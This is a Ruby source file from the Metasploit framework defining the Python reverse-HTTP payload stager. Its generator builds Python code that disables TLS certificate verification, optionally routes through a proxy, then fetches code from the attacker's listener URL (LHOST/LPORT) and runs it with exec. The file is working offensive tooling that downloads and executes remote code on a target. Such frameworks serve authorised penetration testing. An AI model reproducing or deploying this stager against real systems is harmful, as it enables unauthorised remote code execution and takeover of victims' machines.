# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/uuid/options'

module Msf

module Payload::Python::ReverseHttp

  include Msf::Payload::UUID::Options

  def initialize(info = {})
    super(info)
    register_options(
      [
        OptString.new('PayloadProxyHost', [ false, "The proxy server's IP address" ]),
        OptPort.new('PayloadProxyPort', [ true, "The proxy port to connect to", 8080 ])
      ], self.class)
  end

  #
  # Generate the first stage
  #
  def generate(opts={})
    opts.merge!({
      host:       datastore['LHOST'] || '127.127.127.127',
      port:       datastore['LPORT'],
      proxy_host: datastore['PayloadProxyHost'],
      proxy_port: datastore['PayloadProxyPort'],
      user_agent: datastore['MeterpreterUserAgent']
    })
    opts[:scheme] = 'http' if opts[:scheme].nil?

    generate_reverse_http(opts)
  end

  #
  # Return the callback URL
  #
  def generate_callback_url(opts)
    # required opts:
    #   host, port, scheme
    if Rex::Socket.is_ipv6?(opts[:host])
      target_url = "#{opts[:scheme]}://[#{opts[:host]}]"
    else
      target_url = "#{opts[:scheme]}://#{opts[:host]}"
    end

    target_url << ':'
    target_url << opts[:port].to_s
    target_url << generate_callback_uri(opts)
    target_url
  end

  #
  # Return the longest URI that fits into our available space
  #
  def generate_callback_uri(opts={})
    uri_req_len = 30 + rand(256-30)

    # Generate the short default URL if we don't have enough space
    if self.available_space.nil? || required_space > self.available_space
      uri_req_len = 5
    end

    generate_uri_uuid_mode(opts[:uri_uuid_mode] || :init_python, uri_req_len)
  end

  def generate_reverse_http(opts={})
    # required opts:
    #  proxy_host, proxy_port, scheme, user_agent
    var_escape = lambda { |txt|
      txt.gsub('\\', '\\'*4).gsub('\'', %q(\\\'))
    }

    proxy_host = opts[:proxy_host]
    proxy_port = opts[:proxy_port]

    urllib_fromlist = ['\'build_opener\'']
    urllib_fromlist << '\'ProxyHandler\'' if proxy_host.to_s != ''
    urllib_fromlist << '\'HTTPSHandler\'' if opts[:scheme] == 'https'
    urllib_fromlist = '[' + urllib_fromlist.join(',') + ']'

    cmd  = "import sys\n"
    cmd << "vi=sys.version_info\n"
    cmd << "ul=__import__({2:'urllib2',3:'urllib.request'}[vi[0]],fromlist=#{urllib_fromlist})\n"
    cmd << "hs=[]\n"
    if opts[:scheme] == 'https'
      # Context added to HTTPSHandler in 2.7.9 and 3.4.3
      cmd << "if (vi[0]==2 and vi>=(2,7,9)) or vi>=(3,4,3):\n"
      cmd << "\timport ssl\n"
      cmd << "\tsc=ssl.SSLContext(ssl.PROTOCOL_SSLv23)\n"
      cmd << "\tsc.check_hostname=False\n"
      cmd << "\tsc.verify_mode=ssl.CERT_NONE\n"
      cmd << "\ths.append(ul.HTTPSHandler(0,sc))\n"
    end

    if proxy_host.to_s != ''
      proxy_url = Rex::Socket.is_ipv6?(proxy_host) ?
        "http://[#{proxy_host}]:#{proxy_port}" :
        "http://#{proxy_host}:#{proxy_port}"
      cmd << "hs.append(ul.ProxyHandler({'#{opts[:scheme]}':'#{var_escape.call(proxy_url)}'}))\n"
    end

    cmd << "o=ul.build_opener(*hs)\n"
    cmd << "o.addheaders=[('User-Agent','#{var_escape.call(opts[:user_agent])}')]\n"
    cmd << "exec(o.open('#{generate_callback_url(opts)}').read())\n"

    py_create_exec_stub(cmd)
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # Add 100 bytes for the encoder to have some room
    space += 100

    # Make room for the maximum possible URL length
    space += 256

    # The final estimated size
    space
  end

end

end

